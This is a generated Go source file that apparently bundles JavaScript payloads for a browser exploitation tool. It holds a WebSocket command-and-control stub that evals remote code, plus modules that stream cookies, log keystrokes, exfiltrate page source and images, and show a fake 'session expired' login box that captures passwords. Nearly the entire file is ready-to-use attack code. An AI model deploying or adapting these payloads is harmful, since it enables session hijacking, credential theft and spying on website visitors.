// Code generated by go generate; DO NOT EDIT.
// This file was generated by our future AI overlords at
// 2018-11-26 21:29:11.505792888 -0800 PST m=+0.001027828
package payloads

const (
	JSExploitStr = `(function(){ 'use strict';
	//replace these with your own endpoint configuration
	var	host = '127.0.0.1',
		port = '8234',
		proto = 'ws',
		path = '/s';

	var socket = new WebSocket(proto+'://'+host+':'+port+path),
		EvalContext = function(header){
			this.send = function(data, isErr){
				var errCode = (isErr) ? 'z' : '';
				socket.send(errCode+header+data);
			};
		};

	function evctx(js, c){
		return function() { return eval(js); }.call(c);
	}

	socket.onmessage = function(e){
		var d = e.data, ctx = new EvalContext(d.slice(0,8));
		try{
			evctx(d.slice(8), ctx);
		}catch(err){
			//console.log('silently fail:', err);
			ctx.send(err, true)
		}
	};
})();`

	JSExploitMinStr = `(function(){function e(a,b){return function(){return eval(a)}.call(b)}var d=new WebSocket("ws://127.0.0.1:8234/s"),f=function(a){this.send=function(b,c){d.send((c?"z":"")+a+b)}};d.onmessage=function(a){a=a.data;var b=new f(a.slice(0,8));try{e(a.slice(8),b)}catch(c){b.send(c,!0)}}})();`

	JSAlertStr = `if($_$alertMsg){
	alert($_$alertMsg);
}`

	JSCookieStreamStr = `var $_$cookies = document.cookie,
	$_$cookieInt = null,
	$_$self = this;

this.send($_$cookies);
$_$cookieInt = setInterval(function(){
	if(document.cookie !== $_$cookies){
		$_$cookies = document.cookie;
		$_$self.send($_$cookies);
	}
}, 250);`

	JSGetImagesStr = `var $_$self = this,
	$_$images = document.querySelectorAll('img'),
	$_$imagesC = 0,
	$_$canvases = document.querySelectorAll('canvas'),
	$_$canvasesC = 0,
	$_$toDataURL = function(elem, cb) {
		console.log('image uploading attempt');
		if(!elem){
			return;
		}
		elem.crossOrigin = "";
		if(elem.tagName === 'CANVAS'){
			$_$self.send(elem.toDataURL('image/jpeg'));
			cb();
			return;
		}

		var img = new Image();
		img.crossOrigin = 'Anonymous';
		img.onload = function(e) {
			console.log('onload event:', e);
			var canvas = document.createElement('CANVAS'),
				ctx = canvas.getContext('2d'),
				dataURL = null;
			canvas.height = elem.height;
			canvas.width = elem.width;
			ctx.drawImage(img, 0, 0);
			dataURL = canvas.toDataURL('image/jpeg');
			$_$self.send(dataURL);
			cb();
		}
		img.onerror = function(e){
			$_$self.send('error: '+elem.src);
			cb();
		}
		img.src = String(elem.src);
	},
	$_$doImage = function(){
		setTimeout(function(){
			$_$toDataURL($_$images[$_$imagesC], function(){
				$_$imagesC++;
				$_$doImage();
			});
		}, 250);
	},
	$_$doCanvases = function(){
		setTimeout(function(){
			$_$toDataURL($_$canvases[$_$canvasesC], function(){
				$_$canvasesC++;
				$_$doCanvases();
			});
		}, 250);
	};

$_$doCanvases();
$_$doImage();

`

	JSKeyLoggerStr = `var $_$timer = null,
	$_$buffer = [],
	$_$self = this;
document.querySelector('body').addEventListener('keydown', function(e){
	if($_$timer !== null){
		clearTimeout($_$timer);
	}
	$_$buffer.push(e.key);
	$_$timer = setTimeout(function(){
		$_$self.send(JSON.stringify($_$buffer));
		$_$buffer = [];
	}, 1000);
});`

	JSListLinksStr = `var $_$links = document.querySelectorAll('a'),
	$_$buffer = [];

for(var i=0; $_$links != null && i<$_$links.length; i++){
	var $_$link = $_$links[i];
	$_$buffer.push({
		text: $_$link.innerText,
		href: $_$link.href
	});
}

this.send(JSON.stringify($_$buffer));`

	JSPageSourceStr = `this.send(document.documentElement.outerHTML);`

	JSPromptForLoginStr = `var $_$self = this;
(function(self){
	var body = document.querySelector('body'),
		cnt = document.createElement('div');
		cnt.style.width = "100%";
		cnt.style.height = "100%";
		cnt.style.position = "fixed";
		cnt.style.backgroundColor = "#000";
		cnt.style.opacity = "0.5";
		cnt.style.left = "0";
		cnt.style.top = "0";
		cnt.style.zIndex = "10000";
		//cnt.style. = "";
	
	var modal = document.createElement('div'),
		mw = 450,
		mh = 300;
		modal.style.width = mw+"px";
		modal.style.height = mh+"px";
		modal.style.backgroundColor = "#fff";
		modal.style.left = ((window.innerWidth/2)-(mw/2))+"px";
		modal.style.top = ((window.innerHeight/2)-(mh/2))+"px";
		modal.style.position = "fixed";
		modal.style.zIndex = "10001";
		//modal.style. = "";
	
	var modalMsg = document.createElement('div'),
		mmw = 350;
		modalMsg.style.width = mmw+'px';
		modalMsg.style.left = ((mw/2)-(mmw/2))+"px";
		modalMsg.style.top = '35px';
		modalMsg.style.position = 'absolute';
		//modalMsg.style. = '';
		modalMsg.innerHTML = "Your login session has expired. Please login again to continue.";

	var login = document.createElement('div'),
		lw = 160,
		lh = 135,
		lpad = 10;
		login.style.width = lw+"px";
		login.style.height = lh+"px";
		login.style.position = "absolute";
		login.style.padding = lpad+"px";
		login.style.left = ((mw/2)-(lw/2)-lpad)+"px";
		login.style.top = ((mh/2)-(lh/2)-lpad+23)+"px";
		login.style.backgroundColor = "#ccc";
		modal.style.zIndex = "10002";

	var userLabel = document.createElement('label'),
		passLabel = document.createElement('label'),
		userIn = document.createElement('input'),
		passIn = document.createElement('input'),
		userCnt = document.createElement('div'),
		passCnt = document.createElement('div'),
		submitBtn = document.createElement('div');

	userCnt.style.marginBottom = "8px";
	passCnt.style.marginBottom = "8px";

	submitBtn.style.padding = "10px";
	submitBtn.style.width = (lw-20)+"px";
	submitBtn.style.height = "15px";
	submitBtn.style.backgroundColor = "#f4a733";
	submitBtn.style.textAlign = "center";
	submitBtn.style.cursor = "pointer";
	submitBtn.innerHTML = "Login";

	userLabel.innerHTML = 'Username:';
	passLabel.innerHTML = 'Password:';

	userIn.type = 'text';
	userIn.style.width = (lw-4)+'px';

	passIn.type = 'password';
	passIn.style.width = (lw-4)+'px';

	userLabel.appendChild(userIn);
	passLabel.appendChild(passIn);

	userCnt.appendChild(userLabel);
	passCnt.appendChild(passLabel);

	login.appendChild(userCnt);
	login.appendChild(passCnt);
	login.appendChild(submitBtn);

	modal.appendChild(modalMsg);
	modal.appendChild(login);
	body.appendChild(modal);
	body.appendChild(cnt);

	submitBtn.addEventListener('click', function(){
		var user = userIn.value,
			pass = passIn.value;

		if(user.length == 0){
			userLabel.style.color = "red";
		}else{
			userLabel.style.color = "#000";
		}

		if(pass.length == 0) {
			passLabel.style.color = "red";
		}else{
			passLabel.style.color = "#000";
		}

		if(user.length == 0 || pass.length == 0){
			return;
		}

		self.send(JSON.stringify({
			username: user,
			password: pass
		}));

		setTimeout(function(){
			body.removeChild(cnt);
			body.removeChild(modal);
		}, 500);
	});
})($_$self);`

	JSSocketInfoStr = `this.send(JSON.stringify({
	ua: navigator.userAgent, 
	pageUrl: String(document.location), 
	referrer: document.referrer,
	cookies: document.cookie
}));`

	JSXHRStr = `var $_$self = this,
    $_$createReq = function() {
        var XMLHttpFactories = [
                function () {return new XMLHttpRequest()},
                function () {return new ActiveXObject("Msxml3.XMLHTTP")},
                function () {return new ActiveXObject("Msxml2.XMLHTTP.6.0")},
                function () {return new ActiveXObject("Msxml2.XMLHTTP.3.0")},
                function () {return new ActiveXObject("Msxml2.XMLHTTP")},
                function () {return new ActiveXObject("Microsoft.XMLHTTP")}
            ],
            xmlhttp = false;

        for (var i=0;i<XMLHttpFactories.length;i++) {
            try {
                xmlhttp = XMLHttpFactories[i]();
            }catch (e) { continue; }
            break;
        }
        return xmlhttp;
    },
    $_$sendRequest = function(url, contentHeader, postData) {
        var req = $_$createReq();
        if (!req) return;
        var method = (postData) ? "POST" : "GET";
        req.open(method,url,true);
        if (postData){
            req.setRequestHeader('Content-type', contentHeader);
        }
        req.onreadystatechange = function () {
            if (req.readyState != 4) return;
            if (req.status != 200 && req.status != 304) {
                $_$self.send("xhr request failed, status: "+req.status+"\nresponse: "+req.responseText);
                return;
            }
            $_$self.send(req.responseText);
        }
        if (req.readyState == 4) return;
        req.send(postData);
    };

`
)

var (
	JSExploit        = []byte(JSExploitStr)
	JSExploitMin     = []byte(JSExploitMinStr)
	JSAlert          = []byte(JSAlertStr)
	JSCookieStream   = []byte(JSCookieStreamStr)
	JSGetImages      = []byte(JSGetImagesStr)
	JSKeyLogger      = []byte(JSKeyLoggerStr)
	JSListLinks      = []byte(JSListLinksStr)
	JSPageSource     = []byte(JSPageSourceStr)
	JSPromptForLogin = []byte(JSPromptForLoginStr)
	JSSocketInfo     = []byte(JSSocketInfoStr)
	JSXHR            = []byte(JSXHRStr)
)